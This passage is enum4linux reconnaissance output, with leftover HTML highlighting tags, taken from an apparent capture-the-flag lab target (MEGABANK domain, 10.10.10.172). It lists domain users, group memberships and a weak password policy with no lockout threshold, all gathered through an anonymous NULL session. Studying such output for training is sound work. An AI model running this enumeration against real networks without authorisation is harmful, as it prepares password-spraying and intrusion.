user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;dgalanos&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa35&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;roleary&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa36&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;smorgan&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa37&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

 &lt;span class=&#34;o&#34;&gt;=========================================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Share Enumeration on 10.10.10.172    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;=========================================&lt;/span&gt; 

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Attempting to map shares on 10.10.10.172

 &lt;span class=&#34;o&#34;&gt;====================================================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Password Policy Information &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.172    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;====================================================&lt;/span&gt; 


&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Attaching to 10.10.10.172 using a NULL share

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Trying protocol 445/SMB...

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Found domain&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; MEGABANK
	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Builtin

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Password Info &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; Domain: MEGABANK

	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Minimum password length: &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Password &lt;span class=&#34;nb&#34;&gt;history&lt;/span&gt; length: &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;
	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Maximum password age: &lt;span class=&#34;m&#34;&gt;41&lt;/span&gt; days &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt; hours &lt;span class=&#34;m&#34;&gt;53&lt;/span&gt; minutes 
	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Password Complexity Flags: &lt;span class=&#34;m&#34;&gt;000000&lt;/span&gt;

		&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Domain Refuse Password Change: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
		&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Domain Password Store Cleartext: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
		&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Domain Password Lockout Admins: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
		&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Domain Password No Clear Change: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
		&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Domain Password No Anon Change: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
		&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Domain Password Complex: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;

	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Minimum password age: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; day &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; minutes 
	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Reset Account Lockout Counter: &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; minutes 
	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Locked Account Duration: &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; minutes 
	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Account Lockout Threshold: None
	&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Forced Log off Time: Not Set


&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: &lt;span class=&#34;nv&#34;&gt;7&lt;/span&gt;


 &lt;span class=&#34;o&#34;&gt;==============================&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Groups on 10.10.10.172    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;o&#34;&gt;==============================&lt;/span&gt; 

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting &lt;span class=&#34;nb&#34;&gt;builtin&lt;/span&gt; groups:
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Pre-Windows &lt;span class=&#34;m&#34;&gt;2000&lt;/span&gt; Compatible Access&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x22a&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Incoming Forest Trust Builders&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x22d&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Windows Authorization Access Group&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x230&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Terminal Server License Servers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x231&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x221&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Guests&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x222&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Remote Desktop Users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x22b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Network Configuration Operators&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x22c&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Performance Monitor Users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x22e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Performance Log Users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x22f&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Distributed COM Users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x232&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;IIS_IUSRS&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x238&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Cryptographic Operators&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x239&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Event Log Readers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x23d&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Certificate Service DCOM Access&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x23e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;RDS Remote Access Servers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x23f&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;RDS Endpoint Servers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x240&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;RDS Management Servers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x241&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Hyper-V Administrators&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x242&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Access Control Assistance Operators&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x243&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Remote Management Users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x244&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Storage Replica Administrators&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x246&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting &lt;span class=&#34;nb&#34;&gt;builtin&lt;/span&gt; group memberships:
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;IIS_IUSRS&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 568&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Couldn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t lookup SIDs
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Guests&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 546) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Incoming Forest Trust Builders&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 557&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Pre-Windows 2000 Compatible Access&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 554&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Couldn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t lookup SIDs
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Windows Authorization Access Group&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 560) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Remote Management Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 580&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Couldn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t lookup SIDs
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Users&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 545) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; groups:
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Cert Publishers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x205&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;RAS and IAS Servers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x229&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Allowed RODC Password Replication Group&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x23b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Denied RODC Password Replication Group&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x23c&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DnsAdmins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x44d&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SQLServer2005SQLBrowserUser&lt;span class=&#34;nv&#34;&gt;$MONTEVERDE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x44f&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ADSyncAdmins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x451&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ADSyncOperators&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x452&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ADSyncBrowse&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x453&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ADSyncPasswordSet&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x454&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; group memberships:
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;ADSyncAdmins&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 1105&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Couldn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t lookup SIDs
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Denied RODC Password Replication Group&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 572) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting domain groups:
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Enterprise Read-only Domain Controllers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x1f2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Domain Users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x201&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Domain Guests&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x202&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Domain Computers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x203&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Group Policy Creator Owners&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x208&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Cloneable Domain Controllers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x20a&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Protected Users&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x20d&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DnsUpdateProxy&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x44e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Azure Admins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa29&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;File Server Admins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa2e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Call Recording Admins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa2f&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Reception&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa30&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Operations&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa31&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Trading&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa32&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HelpDesk&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa33&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Developers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa34&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting domain group memberships:
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;HelpDesk&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 2611&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oleary
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Trading&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 2610&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\d&lt;/span&gt;galanos
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Operations&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 2609&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;morgan
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Azure Admins&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 2601&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Azure Admins&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 2601&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;AD_987d7f2f57d2
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Azure Admins&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 2601&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;hope
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Guests&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 514&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\G&lt;/span&gt;uest
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\k&lt;/span&gt;rbtgt
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;AD_987d7f2f57d2
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;hope
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ABatchJobs
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc-ata
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc-bexec
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc-netapp
Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\d&lt;/span&gt;galanos
